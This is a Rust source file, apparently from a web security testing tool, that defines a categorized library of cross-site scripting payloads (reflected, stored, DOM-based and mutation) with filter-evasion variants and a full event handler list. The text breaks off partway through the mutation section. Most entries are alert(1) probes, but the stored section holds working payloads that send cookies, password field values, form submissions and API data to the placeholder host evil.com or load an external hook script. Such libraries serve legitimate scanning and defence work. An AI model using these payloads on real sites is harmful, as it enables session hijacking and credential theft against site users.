/// Comprehensive XSS payload library covering reflected, stored, DOM-based, mutation XSS,
/// and polyglot vectors. Organized by injection context (HTML body, attribute, JavaScript
/// string, URL, CSS, SVG, MathML) with WAF bypass variants and an exhaustive event handler list.

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum XssCategory {
    Reflected,
    Stored,
    DomBased,
    MutationXss,
    Polyglot,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum XssContext {
    HtmlBody,
    Attribute,
    JavaScriptString,
    Url,
    Css,
    Svg,
    MathMl,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum XssWafBypass {
    None,
    CaseVariation,
    EncodingBypass,
    TagObfuscation,
    EventObfuscation,
    ProtocolObfuscation,
    CommentInsertion,
    NullByte,
    UnicodeEscape,
    HtmlEntityBypass,
    DoubleEncoding,
    JsTemplateString,
}

#[derive(Debug, Clone)]
pub struct XssPayload {
    pub payload: &'static str,
    pub category: XssCategory,
    pub context: XssContext,
    pub waf_bypass: XssWafBypass,
    pub description: &'static str,
}

impl XssCategory {
    pub fn all() -> &'static [XssCategory] {
        &[
            XssCategory::Reflected,
            XssCategory::Stored,
            XssCategory::DomBased,
            XssCategory::MutationXss,
            XssCategory::Polyglot,
        ]
    }
}

impl XssContext {
    pub fn all() -> &'static [XssContext] {
        &[
            XssContext::HtmlBody,
            XssContext::Attribute,
            XssContext::JavaScriptString,
            XssContext::Url,
            XssContext::Css,
            XssContext::Svg,
            XssContext::MathMl,
        ]
    }
}

/// Exhaustive HTML event handler list for XSS vector generation.
pub const EVENT_HANDLERS: &[&str] = &[
    "onabort",
    "onafterprint",
    "onanimationcancel",
    "onanimationend",
    "onanimationiteration",
    "onanimationstart",
    "onauxclick",
    "onbeforecopy",
    "onbeforecut",
    "onbeforeinput",
    "onbeforematch",
    "onbeforepaste",
    "onbeforeprint",
    "onbeforetoggle",
    "onbeforeunload",
    "onblur",
    "oncancel",
    "oncanplay",
    "oncanplaythrough",
    "onchange",
    "onclick",
    "onclose",
    "oncontentvisibilityautostatechange",
    "oncontextlost",
    "oncontextmenu",
    "oncontextrestored",
    "oncopy",
    "oncuechange",
    "oncut",
    "ondblclick",
    "ondrag",
    "ondragend",
    "ondragenter",
    "ondragleave",
    "ondragover",
    "ondragstart",
    "ondrop",
    "ondurationchange",
    "onemptied",
    "onended",
    "onerror",
    "onfocus",
    "onfocusin",
    "onfocusout",
    "onformdata",
    "onfullscreenchange",
    "onfullscreenerror",
    "ongamepadconnected",
    "ongamepaddisconnected",
    "ongotpointercapture",
    "onhashchange",
    "oninput",
    "oninvalid",
    "onkeydown",
    "onkeypress",
    "onkeyup",
    "onlanguagechange",
    "onload",
    "onloadeddata",
    "onloadedmetadata",
    "onloadstart",
    "onlostpointercapture",
    "onmessage",
    "onmessageerror",
    "onmousedown",
    "onmouseenter",
    "onmouseleave",
    "onmousemove",
    "onmouseout",
    "onmouseover",
    "onmouseup",
    "onmousewheel",
    "onoffline",
    "ononline",
    "onpagehide",
    "onpagereveal",
    "onpageshow",
    "onpageswap",
    "onpaste",
    "onpause",
    "onplay",
    "onplaying",
    "onpointercancel",
    "onpointerdown",
    "onpointerenter",
    "onpointerleave",
    "onpointermove",
    "onpointerout",
    "onpointerover",
    "onpointerrawupdate",
    "onpointerup",
    "onpopstate",
    "onprogress",
    "onratechange",
    "onrejectionhandled",
    "onreset",
    "onresize",
    "onscroll",
    "onscrollend",
    "onsearch",
    "onsecuritypolicyviolation",
    "onseeked",
    "onseeking",
    "onselect",
    "onselectionchange",
    "onselectstart",
    "onslotchange",
    "onstalled",
    "onstorage",
    "onsubmit",
    "onsuspend",
    "ontimeupdate",
    "ontoggle",
    "ontouchcancel",
    "ontouchend",
    "ontouchmove",
    "ontouchstart",
    "ontransitioncancel",
    "ontransitionend",
    "ontransitionrun",
    "ontransitionstart",
    "onunhandledrejection",
    "onunload",
    "onvisibilitychange",
    "onvolumechange",
    "onwaiting",
    "onwebkitanimationend",
    "onwebkitanimationiteration",
    "onwebkitanimationstart",
    "onwebkittransitionend",
    "onwheel",
];

// ---------------------------------------------------------------------------
// Reflected XSS payloads (50+)
// ---------------------------------------------------------------------------
const REFLECTED_PAYLOADS: &[XssPayload] = &[
    XssPayload { payload: "<script>alert(1)</script>", category: XssCategory::Reflected, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::None, description: "Classic script tag injection" },
    XssPayload { payload: "<img src=x onerror=alert(1)>", category: XssCategory::Reflected, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::None, description: "Image error handler" },
    XssPayload { payload: "<svg onload=alert(1)>", category: XssCategory::Reflected, context: XssContext::Svg, waf_bypass: XssWafBypass::None, description: "SVG onload" },
    XssPayload { payload: "<body onload=alert(1)>", category: XssCategory::Reflected, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::None, description: "Body onload" },
    XssPayload { payload: "<input onfocus=alert(1) autofocus>", category: XssCategory::Reflected, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::None, description: "Input autofocus" },
    XssPayload { payload: "<marquee onstart=alert(1)>", category: XssCategory::Reflected, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::None, description: "Marquee onstart" },
    XssPayload { payload: "<details ontoggle open><summary>x</summary></details>", category: XssCategory::Reflected, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::None, description: "Details ontoggle auto-open" },
    XssPayload { payload: "<video><source onerror=alert(1)>", category: XssCategory::Reflected, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::None, description: "Video source error" },
    XssPayload { payload: "<audio src=x onerror=alert(1)>", category: XssCategory::Reflected, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::None, description: "Audio error handler" },
    XssPayload { payload: "<iframe src=\"javascript:alert(1)\">", category: XssCategory::Reflected, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::None, description: "Iframe javascript protocol" },
    XssPayload { payload: "<object data=\"javascript:alert(1)\">", category: XssCategory::Reflected, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::None, description: "Object data javascript protocol" },
    XssPayload { payload: "<embed src=\"javascript:alert(1)\">", category: XssCategory::Reflected, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::None, description: "Embed javascript protocol" },
    XssPayload { payload: "<a href=\"javascript:alert(1)\">click</a>", category: XssCategory::Reflected, context: XssContext::Url, waf_bypass: XssWafBypass::None, description: "Anchor javascript protocol" },
    XssPayload { payload: "<form action=\"javascript:alert(1)\"><input type=submit>", category: XssCategory::Reflected, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::None, description: "Form action javascript" },
    XssPayload { payload: "<isindex action=\"javascript:alert(1)\" type=image>", category: XssCategory::Reflected, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::None, description: "Isindex deprecated tag" },
    XssPayload { payload: "<input type=image src=x onerror=alert(1)>", category: XssCategory::Reflected, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::None, description: "Input image error" },
    XssPayload { payload: "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">", category: XssCategory::Reflected, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::None, description: "Meta refresh javascript" },
    XssPayload { payload: "<table background=\"javascript:alert(1)\">", category: XssCategory::Reflected, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::None, description: "Table background javascript" },
    XssPayload { payload: "<div style=\"background:url('javascript:alert(1)')\">", category: XssCategory::Reflected, context: XssContext::Css, waf_bypass: XssWafBypass::None, description: "CSS background expression" },
    XssPayload { payload: "'-alert(1)-'", category: XssCategory::Reflected, context: XssContext::JavaScriptString, waf_bypass: XssWafBypass::None, description: "JS string breakout with subtraction" },
    XssPayload { payload: "\\'-alert(1)//", category: XssCategory::Reflected, context: XssContext::JavaScriptString, waf_bypass: XssWafBypass::None, description: "Escaped quote breakout" },
    XssPayload { payload: "</script><script>alert(1)</script>", category: XssCategory::Reflected, context: XssContext::JavaScriptString, waf_bypass: XssWafBypass::None, description: "Close existing script context" },
    XssPayload { payload: "\";alert(1)//", category: XssCategory::Reflected, context: XssContext::JavaScriptString, waf_bypass: XssWafBypass::None, description: "Double-quote string breakout" },
    XssPayload { payload: "javascript:alert(1)", category: XssCategory::Reflected, context: XssContext::Url, waf_bypass: XssWafBypass::None, description: "Direct javascript protocol in URL" },
    XssPayload { payload: "data:text/html,<script>alert(1)</script>", category: XssCategory::Reflected, context: XssContext::Url, waf_bypass: XssWafBypass::None, description: "Data URI with HTML" },
    XssPayload { payload: "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", category: XssCategory::Reflected, context: XssContext::Url, waf_bypass: XssWafBypass::None, description: "Base64 data URI" },
    XssPayload { payload: "\" onfocus=alert(1) autofocus=\"", category: XssCategory::Reflected, context: XssContext::Attribute, waf_bypass: XssWafBypass::None, description: "Attribute breakout with onfocus" },
    XssPayload { payload: "' onfocus=alert(1) autofocus='", category: XssCategory::Reflected, context: XssContext::Attribute, waf_bypass: XssWafBypass::None, description: "Single-quote attribute breakout" },
    XssPayload { payload: "\" onmouseover=alert(1) x=\"", category: XssCategory::Reflected, context: XssContext::Attribute, waf_bypass: XssWafBypass::None, description: "Attribute breakout with onmouseover" },
    XssPayload { payload: "><script>alert(1)</script>", category: XssCategory::Reflected, context: XssContext::Attribute, waf_bypass: XssWafBypass::None, description: "Close tag and inject script" },
    XssPayload { payload: "\"><img src=x onerror=alert(1)>", category: XssCategory::Reflected, context: XssContext::Attribute, waf_bypass: XssWafBypass::None, description: "Close attribute and inject img" },
    // WAF bypass reflected
    XssPayload { payload: "<ScRiPt>alert(1)</ScRiPt>", category: XssCategory::Reflected, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::CaseVariation, description: "Mixed case script tag" },
    XssPayload { payload: "<scr<script>ipt>alert(1)</scr</script>ipt>", category: XssCategory::Reflected, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::TagObfuscation, description: "Nested tag confusion" },
    XssPayload { payload: "<script/x>alert(1)</script>", category: XssCategory::Reflected, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::TagObfuscation, description: "Script tag with slash attribute" },
    XssPayload { payload: "<img src=x onerror=\"&#97;lert(1)\">", category: XssCategory::Reflected, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::HtmlEntityBypass, description: "HTML entity in event handler" },
    XssPayload { payload: "<img src=x onerror=\\u0061lert(1)>", category: XssCategory::Reflected, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::UnicodeEscape, description: "Unicode escape in handler" },
    XssPayload { payload: "<img/src=x onerror=alert(1)>", category: XssCategory::Reflected, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::TagObfuscation, description: "Slash instead of space" },
    XssPayload { payload: "<img\tsrc=x\tonerror=alert(1)>", category: XssCategory::Reflected, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::TagObfuscation, description: "Tab instead of space" },
    XssPayload { payload: "<img\nsrc=x\nonerror=alert(1)>", category: XssCategory::Reflected, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::TagObfuscation, description: "Newline instead of space" },
    XssPayload { payload: "<img src=x onerror=alert`1`>", category: XssCategory::Reflected, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::EncodingBypass, description: "Template literal instead of parens" },
    XssPayload { payload: "<svg/onload=alert(1)>", category: XssCategory::Reflected, context: XssContext::Svg, waf_bypass: XssWafBypass::TagObfuscation, description: "SVG slash separator" },
    XssPayload { payload: "<svg onload=alert&lpar;1&rpar;>", category: XssCategory::Reflected, context: XssContext::Svg, waf_bypass: XssWafBypass::HtmlEntityBypass, description: "HTML entities for parentheses" },
    XssPayload { payload: "%3Cscript%3Ealert(1)%3C/script%3E", category: XssCategory::Reflected, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::EncodingBypass, description: "URL-encoded script tag" },
    XssPayload { payload: "%253Cscript%253Ealert(1)%253C/script%253E", category: XssCategory::Reflected, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::DoubleEncoding, description: "Double URL-encoded script tag" },
    XssPayload { payload: "<script>alert(String.fromCharCode(88,83,83))</script>", category: XssCategory::Reflected, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::EncodingBypass, description: "String.fromCharCode bypass" },
    XssPayload { payload: "<script>eval(atob('YWxlcnQoMSk='))</script>", category: XssCategory::Reflected, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::EncodingBypass, description: "Base64 eval bypass" },
    XssPayload { payload: "<script>window['al'+'ert'](1)</script>", category: XssCategory::Reflected, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::EncodingBypass, description: "String concatenation bypass" },
    XssPayload { payload: "<script>this[`al`+`ert`](1)</script>", category: XssCategory::Reflected, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::JsTemplateString, description: "Template string concat bypass" },
    XssPayload { payload: "<script>\\u0061lert(1)</script>", category: XssCategory::Reflected, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::UnicodeEscape, description: "Unicode escape in script body" },
    XssPayload { payload: "<img src=x onerror=alert(1)//", category: XssCategory::Reflected, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::TagObfuscation, description: "Comment-style tag close" },
    XssPayload { payload: "<x onclick=alert(1)>click", category: XssCategory::Reflected, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::TagObfuscation, description: "Custom tag with event handler" },
    XssPayload { payload: "<math><mi>x</mi><annotation-xml encoding=\"text/html\"><img src=x onerror=alert(1)></annotation-xml></math>", category: XssCategory::Reflected, context: XssContext::MathMl, waf_bypass: XssWafBypass::None, description: "MathML annotation HTML injection" },
];

// ---------------------------------------------------------------------------
// Stored XSS payloads (30+)
// ---------------------------------------------------------------------------
const STORED_PAYLOADS: &[XssPayload] = &[
    XssPayload { payload: "<script>document.location='http://evil.com/?c='+document.cookie</script>", category: XssCategory::Stored, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::None, description: "Cookie exfiltration via redirect" },
    XssPayload { payload: "<img src=x onerror=\"fetch('http://evil.com/?c='+document.cookie)\">", category: XssCategory::Stored, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::None, description: "Cookie exfiltration via fetch" },
    XssPayload { payload: "<script>new Image().src='http://evil.com/?c='+document.cookie</script>", category: XssCategory::Stored, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::None, description: "Cookie exfiltration via Image" },
    XssPayload { payload: "<script>navigator.sendBeacon('http://evil.com',document.cookie)</script>", category: XssCategory::Stored, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::None, description: "Beacon API exfiltration" },
    XssPayload { payload: "<svg onload=\"fetch('/api/admin',{method:'DELETE'})\">", category: XssCategory::Stored, context: XssContext::Svg, waf_bypass: XssWafBypass::None, description: "Stored XSS triggering admin action" },
    XssPayload { payload: "<script>document.querySelector('form').action='http://evil.com'</script>", category: XssCategory::Stored, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::None, description: "Form hijacking" },
    XssPayload { payload: "<script>setInterval(()=>fetch('http://evil.com/?k='+document.querySelector('input[type=password]')?.value),1000)</script>", category: XssCategory::Stored, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::None, description: "Keylogger via polling" },
    XssPayload { payload: "<div contenteditable onblur=alert(1)>type here</div>", category: XssCategory::Stored, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::None, description: "Contenteditable onblur" },
    XssPayload { payload: "<style>@import'http://evil.com/xss.css';</style>", category: XssCategory::Stored, context: XssContext::Css, waf_bypass: XssWafBypass::None, description: "CSS import external stylesheet" },
    XssPayload { payload: "<link rel=stylesheet href='http://evil.com/xss.css'>", category: XssCategory::Stored, context: XssContext::Css, waf_bypass: XssWafBypass::None, description: "External stylesheet link" },
    XssPayload { payload: "<script>window.addEventListener('message',e=>eval(e.data))</script>", category: XssCategory::Stored, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::None, description: "PostMessage listener for persistence" },
    XssPayload { payload: "<base href='http://evil.com/'>", category: XssCategory::Stored, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::None, description: "Base tag hijack" },
    XssPayload { payload: "<script>document.write('<img src=http://evil.com/?'+document.cookie+'>')</script>", category: XssCategory::Stored, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::None, description: "Document.write exfil" },
    XssPayload { payload: "<textarea onfocus=alert(1) autofocus>", category: XssCategory::Stored, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::None, description: "Textarea autofocus trigger" },
    XssPayload { payload: "<select onfocus=alert(1) autofocus>", category: XssCategory::Stored, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::None, description: "Select autofocus trigger" },
    XssPayload { payload: "<keygen onfocus=alert(1) autofocus>", category: XssCategory::Stored, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::None, description: "Keygen autofocus trigger" },
    XssPayload { payload: "<script>fetch('/api/user').then(r=>r.json()).then(d=>fetch('http://evil.com/?d='+JSON.stringify(d)))</script>", category: XssCategory::Stored, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::None, description: "API data exfiltration" },
    XssPayload { payload: "<script>for(let f of document.forms)f.addEventListener('submit',e=>{fetch('http://evil.com',{method:'POST',body:new FormData(f)})})</script>", category: XssCategory::Stored, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::None, description: "Form data interceptor" },
    XssPayload { payload: "<script>history.pushState({},'','/');</script>", category: XssCategory::Stored, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::None, description: "URL masking for phishing" },
    XssPayload { payload: "<button popovertarget=x>Click</button><div popover id=x onbeforetoggle=alert(1)>pwn</div>", category: XssCategory::Stored, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::None, description: "Popover API XSS" },
    XssPayload { payload: "<script>document.title=document.cookie</script>", category: XssCategory::Stored, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::None, description: "Leak cookie in document title" },
    XssPayload { payload: "<script>if(document.domain=='admin.target.com'){fetch('http://evil.com/?admin=1')}</script>", category: XssCategory::Stored, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::None, description: "Conditional admin domain exfil" },
    XssPayload { payload: "<script>Object.defineProperty(document,'cookie',{get:()=>{fetch('http://evil.com')}})</script>", category: XssCategory::Stored, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::None, description: "Cookie getter trap" },
    XssPayload { payload: "<script>new MutationObserver(m=>fetch('http://evil.com/?m='+btoa(m[0].target.innerHTML))).observe(document.body,{childList:true,subtree:true})</script>", category: XssCategory::Stored, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::None, description: "DOM mutation observer exfil" },
    XssPayload { payload: "<noscript><img src=x onerror=alert(1)></noscript>", category: XssCategory::Stored, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::None, description: "Noscript context injection" },
    XssPayload { payload: "<script>let s=document.createElement('script');s.src='http://evil.com/hook.js';document.head.appendChild(s)</script>", category: XssCategory::Stored, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::None, description: "External script injection for persistence" },
    XssPayload { payload: "<img src=valid.png onload=alert(1)>", category: XssCategory::Stored, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::None, description: "Valid image onload trigger" },
    XssPayload { payload: "<script>crypto.subtle.digest('SHA-256',new TextEncoder().encode(document.cookie)).then(h=>fetch('http://evil.com/?h='+btoa(String.fromCharCode(...new Uint8Array(h)))))</script>", category: XssCategory::Stored, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::None, description: "Hash exfiltration for stealth" },
    XssPayload { payload: "<svg><use href='data:image/svg+xml,<svg id=x xmlns=http://www.w3.org/2000/svg><image href=x onerror=alert(1) /></svg>#x'>", category: XssCategory::Stored, context: XssContext::Svg, waf_bypass: XssWafBypass::None, description: "SVG use element with data URI" },
    XssPayload { payload: "<script>window.name=document.cookie</script>", category: XssCategory::Stored, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::None, description: "Window.name cookie leak cross-tab" },
    XssPayload { payload: "<script>indexedDB.open('xss').onsuccess=e=>{let db=e.target.result;let tx=db.createObjectStore('d');tx.put(document.cookie,'c')}</script>", category: XssCategory::Stored, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::None, description: "IndexedDB persistence" },
];

// ---------------------------------------------------------------------------
// DOM-based XSS payloads (30+)
// ---------------------------------------------------------------------------
const DOM_BASED_PAYLOADS: &[XssPayload] = &[
    XssPayload {
        payload: "#<img src=x onerror=alert(1)>",
        category: XssCategory::DomBased,
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::None,
        description: "Fragment injection via innerHTML",
    },
    XssPayload {
        payload: "#\"><img src=x onerror=alert(1)>",
        category: XssCategory::DomBased,
        context: XssContext::Attribute,
        waf_bypass: XssWafBypass::None,
        description: "Fragment attribute breakout",
    },
    XssPayload {
        payload: "?default=<script>alert(1)</script>",
        category: XssCategory::DomBased,
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::None,
        description: "Query param to document.write",
    },
    XssPayload {
        payload: "javascript:alert(document.domain)",
        category: XssCategory::DomBased,
        context: XssContext::Url,
        waf_bypass: XssWafBypass::None,
        description: "Location assignment javascript proto",
    },
    XssPayload {
        payload: "?next=javascript:alert(1)",
        category: XssCategory::DomBased,
        context: XssContext::Url,
        waf_bypass: XssWafBypass::None,
        description: "Open redirect to javascript proto",
    },
    XssPayload {
        payload: "?q='-alert(1)-'",
        category: XssCategory::DomBased,
        context: XssContext::JavaScriptString,
        waf_bypass: XssWafBypass::None,
        description: "Query param eval injection",
    },
    XssPayload {
        payload: "?callback=alert",
        category: XssCategory::DomBased,
        context: XssContext::JavaScriptString,
        waf_bypass: XssWafBypass::None,
        description: "JSONP callback parameter",
    },
    XssPayload {
        payload: "?template={{constructor.constructor('alert(1)')()}}",
        category: XssCategory::DomBased,
        context: XssContext::JavaScriptString,
        waf_bypass: XssWafBypass::None,
        description: "Client-side template injection",
    },
    XssPayload {
        payload: "#javascript:alert(1)",
        category: XssCategory::DomBased,
        context: XssContext::Url,
        waf_bypass: XssWafBypass::None,
        description: "Fragment to location.href",
    },
    XssPayload {
        payload: "?url=javascript:alert(1)",
        category: XssCategory::DomBased,
        context: XssContext::Url,
        waf_bypass: XssWafBypass::None,
        description: "URL param to window.open",
    },
    XssPayload {
        payload: "?name=<img/src/onerror=alert(1)>",
        category: XssCategory::DomBased,
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::TagObfuscation,
        description: "Slash-based attribute injection",
    },
    XssPayload {
        payload: "?msg=<svg/onload=alert(1)>",
        category: XssCategory::DomBased,
        context: XssContext::Svg,
        waf_bypass: XssWafBypass::None,
        description: "SVG via DOM manipulation",
    },
    XssPayload {
        payload: "?search=</script><script>alert(1)</script>",
        category: XssCategory::DomBased,
        context: XssContext::JavaScriptString,
        waf_bypass: XssWafBypass::None,
        description: "Script context break via search param",
    },
    XssPayload {
        payload: "#';alert(1)//",
        category: XssCategory::DomBased,
        context: XssContext::JavaScriptString,
        waf_bypass: XssWafBypass::None,
        description: "Fragment JS string breakout",
    },
    XssPayload {
        payload: "?input=<details open ontoggle=alert(1)>",
        category: XssCategory::DomBased,
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::None,
        description: "Details ontoggle via DOM",
    },
    XssPayload {
        payload: "#<style>*{background:url('javascript:alert(1)')}</style>",
        category: XssCategory::DomBased,
        context: XssContext::Css,
        waf_bypass: XssWafBypass::None,
        description: "Fragment CSS injection",
    },
    XssPayload {
        payload: "?data=<iframe srcdoc='<script>alert(1)</script>'>",
        category: XssCategory::DomBased,
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::None,
        description: "Iframe srcdoc injection",
    },
    XssPayload {
        payload: "?x=<object data=javascript:alert(1)>",
        category: XssCategory::DomBased,
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::None,
        description: "Object data protocol injection",
    },
    XssPayload {
        payload: "?ref=data:text/html,<script>alert(1)</script>",
        category: XssCategory::DomBased,
        context: XssContext::Url,
        waf_bypass: XssWafBypass::None,
        description: "Data URI via referer",
    },
    XssPayload {
        payload: "#<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
        category: XssCategory::DomBased,
        context: XssContext::MathMl,
        waf_bypass: XssWafBypass::None,
        description: "MathML namespace confusion",
    },
    XssPayload {
        payload: "?domid=x\" onfocus=alert(1) autofocus id=\"",
        category: XssCategory::DomBased,
        context: XssContext::Attribute,
        waf_bypass: XssWafBypass::None,
        description: "DOM ID attribute injection",
    },
    XssPayload {
        payload: "?postMessage=<img src=x onerror=alert(1)>",
        category: XssCategory::DomBased,
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::None,
        description: "PostMessage handler injection",
    },
    XssPayload {
        payload: "?src=http://evil.com/xss.js",
        category: XssCategory::DomBased,
        context: XssContext::Url,
        waf_bypass: XssWafBypass::None,
        description: "Script src pollution",
    },
    XssPayload {
        payload: "?__proto__[innerHTML]=<img src=x onerror=alert(1)>",
        category: XssCategory::DomBased,
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::None,
        description: "Prototype pollution to DOM XSS",
    },
    XssPayload {
        payload: "?constructor[prototype][innerHTML]=<img/src/onerror=alert(1)>",
        category: XssCategory::DomBased,
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::None,
        description: "Constructor prototype pollution",
    },
    XssPayload {
        payload: "#<a id=x tabindex=1 onfocus=alert(1)></a>",
        category: XssCategory::DomBased,
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::None,
        description: "Focus target via fragment ID",
    },
    XssPayload {
        payload: "?lang=en</script><script>alert(1)//",
        category: XssCategory::DomBased,
        context: XssContext::JavaScriptString,
        waf_bypass: XssWafBypass::None,
        description: "Language param script break",
    },
    XssPayload {
        payload: "?source=fetch('http://evil.com')",
        category: XssCategory::DomBased,
        context: XssContext::JavaScriptString,
        waf_bypass: XssWafBypass::None,
        description: "Direct eval via source param",
    },
    XssPayload {
        payload: "#<select autofocus onfocus=alert(1)>",
        category: XssCategory::DomBased,
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::None,
        description: "Select autofocus DOM",
    },
    XssPayload {
        payload: "?path=/../<script>alert(1)</script>",
        category: XssCategory::DomBased,
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::None,
        description: "Path traversal script injection",
    },
    XssPayload {
        payload: "?view=<embed src=javascript:alert(1)>",
        category: XssCategory::DomBased,
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::None,
        description: "Embed element via DOM",
    },
];

// ---------------------------------------------------------------------------
// Mutation XSS payloads (20+)
// ---------------------------------------------------------------------------
const MUTATION_XSS_PAYLOADS: &[XssPayload] = &[
    XssPayload { payload: "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">", category: XssCategory::MutationXss, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::None, description: "Noscript mutation bypass" },
    XssPayload { payload: "<listing><img src=1 onerror=alert(1)>", category: XssCategory::MutationXss, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::None, description: "Listing tag mutation" },
    XssPayload { payload: "<table><caption><svg onload=alert(1)>", category: XssCategory::MutationXss, context: XssContext::Svg, waf_bypass: XssWafBypass::None, description: "Table caption SVG foster parenting" },
    XssPayload { payload: "<math><mtext><table><mglyph><style><!--</style><img title=\"-->&lt;img src=1 onerror=alert(1)&gt;\">", category: XssCategory::MutationXss, context: XssContext::MathMl, waf_bypass: XssWafBypass::None, description: "MathML mglyph style mutation" },
    XssPayload { payload: "<form><math><mtext></form><form><mglyph><svg><style></math><img src onerror=alert(1)>", category: XssCategory::MutationXss, context: XssContext::MathMl, waf_bypass: XssWafBypass::None, description: "Form mutation with MathML" },
    XssPayload { payload: "<svg><style>{font-family:<img/src=x onerror=alert(1)>}", category: XssCategory::MutationXss, context: XssContext::Svg, waf_bypass: XssWafBypass::None, description: "SVG style mutation" },
    XssPayload { payload: "<math><mtext><img src=x onerror=alert(1)></mtext></math>", category: XssCategory::MutationXss, context: XssContext::MathMl, waf_bypass: XssWafBypass::None, description: "MathML mtext integration point" },
    XssPayload { payload: "<svg><desc><svg onload=alert(1)>", category: XssCategory::MutationXss, context: XssContext::Svg, waf_bypass: XssWafBypass::None, description: "SVG desc nested SVG mutation" },
    XssPayload { payload: "<svg><title><img src=x onerror=alert(1)></title></svg>", category: XssCategory::MutationXss, context: XssContext::Svg, waf_bypass: XssWafBypass::None, description: "SVG title integration point" },
    XssPayload { payload: "<math><annotation-xml encoding=\"text/html\"><svg onload=alert(1)>", category: XssCategory::MutationXss, context: XssContext::MathMl, waf_bypass: XssWafBypass::None, description: "MathML annotation to HTML" },
    XssPayload { payload: "<xmp><img src=x onerror=alert(1)></xmp>", category: XssCategory::MutationXss, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::None, description: "XMP tag raw text mutation" },
    XssPayload { payload: "<frameset onload=alert(1)>", category: XssCategory::MutationXss, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::None, description: "Frameset replaces body" },
    XssPayload { payload: "<table><tr><td><svg><desc><template><img src=x onerror=alert(1)>", category: XssCategory::MutationXss, context: XssContext::Svg, waf_bypass: XssWafBypass::None, description: "Table template mutation" },
    XssPayload { payload: "<div><template><img src=x onerror=alert(1)></template></div>", category: XssCategory::MutationXss, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::None, description: "Template content extraction" },
    XssPayload { payload: "<svg><foreignObject><body onload=alert(1)>", category: XssCategory::MutationXss, context: XssContext::Svg, waf_bypass: XssWafBypass::None, description: "SVG foreignObject escape" },
